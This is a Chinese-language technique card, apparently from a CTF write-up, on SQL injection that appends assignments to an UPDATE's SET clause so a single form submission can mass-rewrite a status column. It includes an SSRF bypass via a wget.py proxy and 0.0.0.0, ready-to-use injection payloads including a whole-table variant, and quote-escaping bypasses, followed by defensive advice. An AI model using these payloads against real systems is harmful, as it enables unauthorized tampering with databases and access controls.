---
id: web-generic-sqli-update-set-clause-extra-assignment
title: UPDATE 的 SET 子句直接把表单字段拼进语句：在某个赋值项里用单引号闭合后追加 ,列=值 WHERE 条件-- ，一次请求批量改写全表签约状态
type: scenario
domain: web
path: web/generic/sqli
technique: update-set-clause-extra-assignment-injection
aliases:
- SET 子句注入
- update 注入追加赋值
- city 参数注入
- 用注入改其它列
- au_id 全改 1
- 追加 where 条件
tags:
- web
- sqli
- update
- set-clause
- mssql
- sql-server
- parameter-tampering
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:36:42+08:00'
  notes: 已对照原文核对；wget.py?url=http://0.0.0.0/cgi-bin/local/flag.py 绕过 127.0.0.1 限制拿提示、flag.py 403、city 参数单引号后无法回显判定注入点、完整表单串与 city=aa',contract=1 where au_id='893-72-1158'--+ 的追加赋值 payload 均与正文一致；本次核对未读取图片，仅依据正文；更新接口路径 /cgi-bin/update.py、SET 列表的具体列与注释符后尾部片段属按表单字段推演的整理写法，原文未给出；数据库类型（MSSQL/SQL Server）为据 pubs 风格字段名与 --+ 注释推断，正文未明写
---

## 一句话结论

当接口把多个表单字段依次拼进同一条 `UPDATE ... SET a='$a', b='$b', ... WHERE id='$id'` 时，注入点不只在 `WHERE`——把任意一个赋值项的值闭合引号后追加 `,目标列=期望值 WHERE 真实条件-- `，就能**增加一个新的赋值项并重写 WHERE**，用一次表单提交把「只改自己这一行」变成「批量改所有行」。本例把 `city` 参数注入成 `city=aa',contract=1 where au_id='893-72-1158'-- `，使全部作者的 `contract` 置 1，从而通过「所有人都已签约」的校验并读到 flag。

## 原理

- **SET 子句是逗号分隔的赋值列表**：`UPDATE t SET c1='x', c2='y' WHERE ...`。若 `c2` 的值来自用户且未转义，注入 `aa', contract=1 WHERE au_id='...'-- ` 后拼接结果为 `SET ..., city='aa', contract=1 WHERE au_id='893-72-1158'-- ' WHERE au_id='<原条件>'`，注释符吃掉尾部，语句变为「把该行的 city 与 contract 一起改」；把 `WHERE` 里的 `au_id` 换成恒真条件（或直接省略 WHERE）即可改全表。
- **为什么选改「别的列」而不只是改本行**：业务校验通常看某个状态列（这里是「签约」）。只改自己那一行不满足「所有人都签约」，必须借 SET 列表追加赋值把状态列整表改成期望值，这是本类注入的核心价值。
- **单引号闭合是入口**：目标把字符串参数包在单引号里，`city=aa'` 让引号闭合，后面就是自由拼写的 SQL 片段。若后端用 `'` 转义，改试 `%bf%27`（GBK 宽字节）、双写 `''`、或 `\`（MySQL 的 `NO_BACKSLASH_ESCAPES` 关闭时）。
- **`--` 之后必须有空白/加号**：SQL Server 里 `--` 注释到行尾，但 URL 里 `+` 会被解成空格，所以常写 `-- ` 或 `--+`；MySQL 里 `--` 后必须跟空白，`#` 也可作行注释。
- **`au_id` 里的 `-` 是数据不是减法**：`893-72-1158` 这类业务 ID 含连字符，注入时把它整体放进引号内，避免被解析成算术表达式。

## 触发条件

- 存在保存/更新资料的接口，后端用字符串拼接构造 `UPDATE`，且 SET 列表里至少有一个可控字段。
- 校验逻辑依赖某个可在 SET 里改写的列（状态位、角色、签约标志、审核结果）。
- 数据库允许在单条 `UPDATE` 中带 `WHERE` 与注释符（SQL Server / MySQL / PostgreSQL 均可，注释语法略有差异）。
- 攻击者能提交完整的表单字段（其余字段填合法值即可，不需要知道真实主键以外的东西）。

## 利用步骤

1. 先摸路由：去掉路径末段（把 `/index` 换成 `/`）常能暴露路由清单，从中发现「被保护的结果页」与「代理/取回类工具页」（本例 `cgi-bin/wget.py`）。被保护页直接访问 403 时，用代理页的 `url=` 参数以 `http://0.0.0.0/<被保护路径>` 让服务端自己取，拿到「需要什么条件才给结果」的提示。
2. 找一个「更新资料」表单，提交一次合法数据，抓包记录全部字段名（本例 `au_id/au_lname/au_fname/phone/address/city/state/zip`）。
3. 逐字段试闭合符：在疑似字符串字段后插入 `'`，观察是否报错、是否写入异常值、是否页面异常（本例 `city` 出现「无法回显」即疑似注入点）。
4. 构造追加赋值：`city=aa',contract=1 where au_id='893-72-1158'-- `（把 `contract` 换成目标状态列，`where` 换成能命中目标行的条件，或直接删掉 where 改全表）。
5. 提交后重新拉取列表/详情页，确认状态列已被改写。
6. 回到第 1 步那个原本 403 的结果页（直连或用代理页取），校验通过即拿到结果。
7. 若想精确控制影响面，把 `WHERE` 收窄成 `where au_id like '%'` 或某个业务前缀，避免改到不该改的行。

## PoC

第 0 步——用取回代理绕过 403（`0.0.0.0` 在本机等价回环）：

```text
GET /cgi-bin/wget.py?url=http://0.0.0.0/cgi-bin/local/flag.py HTTP/1.1
```

第 1 步——SET 子句追加赋值：

```text
POST /cgi-bin/update.py HTTP/1.1
Content-Type: application/x-www-form-urlencoded

au_id=893-72-1158&au_lname=McBadden&au_fname=Heather&phone=707+448-4982&address=301+Putnam&city=aa',contract=1%20where%20au_id='893-72-1158'--+&state=CA&zip=95688
```

对应拼接后的语句：

```sql
UPDATE authors
   SET au_lname='McBadden', au_fname='Heather', phone='707 448-4982',
       address='301 Putnam', city='aa', contract=1
 WHERE au_id='893-72-1158'-- ', state='CA', zip='95688'
 WHERE au_id='893-72-1158'
```

注释符之后的原条件被丢弃，实际执行的是「把该行 `contract` 设为 1」。

改全表版本（去掉 `where`）：

```text
city=aa',contract=1--+
```

## 变体与关联

- 语法变体：`INSERT ... VALUES` 的字段值注入（可插入额外行）、`ORDER BY`/`GROUP BY` 注入、`LIMIT` 注入，本质都是「参数被当成 SQL 结构而非数据」。
- 注释变体：MySQL 用 `#` 或 `-- `（必须带空格），SQL Server 用 `--`，PostgreSQL 用 `--`；`/*` 未闭合也可吃掉尾部。
- 闭合变体：数字型字段无需引号，直接 `1,contract=1-- `；被 `addslashes` 转义时用宽字节 `%bf%27`（GBK）或二次注入。
- 关联：与「布尔盲注」「UNION 注入」的区别是这里不需要回显或布尔位——漏洞的价值在于**写**，直接改库即可让业务校验通过；与「越权改状态」类卡的结合点在于：拿不到管理员会话时，用注入直接把审批/签约状态写成通过。
- 前置链路变体：本例的「要改什么状态、改哪一行」是靠提示拿到的——受保护的路由 `cgi-bin/local/flag.py` 直接访问 403，但同站还有个 `cgi-bin/wget.py?url=` 的取回代理，用 `url=http://0.0.0.0/cgi-bin/local/flag.py`（`0.0.0.0` 在本机等价回环，且常能绕过只拦 `127.0.0.1`/`localhost` 字样的黑名单）让服务端自己去取，就绕过了「来源 IP 限制」拿到提示内容。拿到提示后再回到本卡的 SET 注入改状态，最终访问原 403 路由取结果。

## 检测与防御

- 所有 SQL 一律参数化（PDO/PreparedStatement/ORM 绑定），不要拼接任何用户输入进 SET 列表。
- 对「状态类」列做服务端白名单赋值：只接受枚举值，且赋值语句里只出现当前用户有权修改的列名。
- 校验逻辑不要只依赖数据库里的单个状态位；对「所有人已签约」这类全局判断应加操作审计与二次确认。
- 检测：Web 日志里出现 `city=` 等参数含 `'`、`--`、`%23`、`/*` 的请求；数据库侧监控单条 `UPDATE` 影响行数异常放大（本类注入常把 1 行变成 N 行）。
